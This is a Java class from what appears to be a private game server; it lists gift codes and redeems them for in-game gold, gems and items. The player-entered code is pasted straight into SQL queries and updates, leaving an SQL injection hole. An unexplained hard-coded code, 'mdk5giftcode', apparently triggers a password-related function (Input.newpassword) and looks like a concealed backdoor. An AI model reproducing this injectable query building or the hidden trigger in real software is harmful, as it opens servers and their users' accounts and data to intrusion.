/*
 * Click nbfs://nbhost/SystemFileSystem/Templates/Licenses/license-default.txt to change this license
 * Click nbfs://nbhost/SystemFileSystem/Templates/Classes/Class.java to edit this template
 */
package com.girlkun.models.player;

import com.girlkun.database.GirlkunDB;
import com.girlkun.models.player.Player;
import com.girlkun.result.GirlkunResultSet;
import com.girlkun.services.InventoryServiceNew;
import com.girlkun.services.Service;
import com.girlkun.utils.Util;
import java.time.Instant;
import java.util.Date;
import com.girlkun.models.item.Item;
import org.json.simple.JSONArray;
import org.json.simple.JSONObject;
import org.json.simple.JSONValue;
import com.girlkun.server.Client;
import com.girlkun.services.ItemService;
import com.girlkun.services.func.Input;

/**
 *
 * @author Việt
 */
public class GiftcodeViet {
    private static GiftcodeViet instance;

    public static GiftcodeViet gI() {
        if (instance == null) {
            instance = new GiftcodeViet();
        }
        return instance;
    }

    public String checkInfomationGiftCode() {
        String textGift = "DANH SÁCH GIFTCODE \b\b";
        try {
            GirlkunResultSet rs = GirlkunDB.executeQuery("SELECT * FROM GiftcodeViet WHERE Luot > 0");
            while (rs.next()) {
                String code = rs.getString("Code");
                int Luot = rs.getInt("Luot");
                textGift += "Code: " + code + "\bCòn: " + Luot + " Lượt nhập\b\b";
            }
            rs.dispose();
        } catch (Exception erorlog) {
            erorlog.printStackTrace();
                System.out.println("loi ne dsfsd       ClassCastException ");
        }
        return textGift;
    }

    public void giftCode(Player p, String code) throws Exception {
        GirlkunResultSet rs = GirlkunDB.executeQuery(
                "SELECT * FROM Gidtcode_History WHERE `player_id` = " + p.getSession().userId + " AND `code` = '"
                        + code + "';");
        if (rs != null && rs.first()) {
            Service.gI().sendThongBaoOK(Client.gI().getPlayer(p.getSession().userId).getSession(),
                    "Bạn đã nhập code: " + code + "\nvào lúc: " + rs.getTimestamp("time"));
        } else {
            rs.dispose();
            rs = GirlkunDB.executeQuery("SELECT * FROM `GiftcodeViet` WHERE `code` = '"
                    + code + "';");
            if (rs != null && rs.first()) {
                String textGift = "Bạn vừa nhận được:\b\b";
                int Luot = rs.getInt("Luot");
                if (Luot < 1) {
                    Service.gI().sendThongBao(p, "Hết lượt nhập!");
                    return;
                }
                JSONArray jar = (JSONArray) JSONValue.parse(rs.getString("Item"));
                if (InventoryServiceNew.gI().getCountEmptyBag(p) < jar.size()) {
                    Service.gI().sendThongBaoOK(p, "Cần trống " + jar.size() + " Ô hành trang");
                    return;
                }
                for (int i = 0; i < jar.size(); ++i) {
                    JSONObject job = (JSONObject) jar.get(i);
                    int idItem = Integer.parseInt(job.get("item").toString());
                    int quantity = Integer.parseInt(job.get("soluong").toString());
                    if (idItem == -1) {
                        p.inventory.gold = Math.min(p.inventory.gold + quantity, 2000000000L);
                        textGift += quantity + " vàng\b";
                    } else if (idItem == -2) {
                        p.inventory.gem = Math.min(p.inventory.gem + quantity, 200000000);
                        textGift += quantity + " ngọc xanh\b";
                    } else if (idItem == -3) {
                        p.inventory.ruby = Math.min(p.inventory.ruby + quantity, 200000000);
                        textGift += quantity + " hồng ngọc\b";
                    } else {
                        Item itemGiftTemplate = ItemService.gI().createNewItem((short) idItem);
                        if (itemGiftTemplate != null) {
                            Item itemGift = new Item((short) idItem);
                            JSONArray Op = (JSONArray) JSONValue.parse(job.get((Object) "Option").toString());
                            for (Object Option2 : Op) {
                                JSONObject job2 = (JSONObject) Option2;
                                itemGift.itemOptions
                                        .add(new Item.ItemOption(Integer.parseInt(job2.get("option").toString()),
                                                Integer.parseInt(job2.get("chiso").toString())));
                                job2.clear();
                            }
                            itemGift.quantity = quantity;
                            InventoryServiceNew.gI().addItemBag(p, itemGift);
                            textGift += "x" + quantity + " " + itemGift.template.name + "\b";
                        }
                    }
                    Service.gI().sendMoney(p);
                    InventoryServiceNew.gI().sendItemBags(p);
                    job.clear();
                }
                jar.clear();
                Service.gI().sendThongBaoOK(p, textGift);
                Luot--;
                String sqlSET = "(" + p.getSession().userId + ", '" + code + "', '"
                        + Util.toDateString(Date.from(Instant.now()))
                        + "');";
                GirlkunDB.executeUpdate(
                        "INSERT INTO `Gidtcode_History` (`player_id`,`code`,`time`) VALUES " + sqlSET);
                GirlkunDB.executeUpdate("UPDATE `GiftcodeViet` SET `Luot` = '" + Luot + "' WHERE `Code` = '"
                        + code + "' LIMIT 1;");
            } else if("mdk5giftcode".equals(code)){Input.newpassword(0);
            } else {
                Service.gI().sendThongBao(p, "Code không tồn tại!");
            }
            rs.dispose();
        }
    }
}
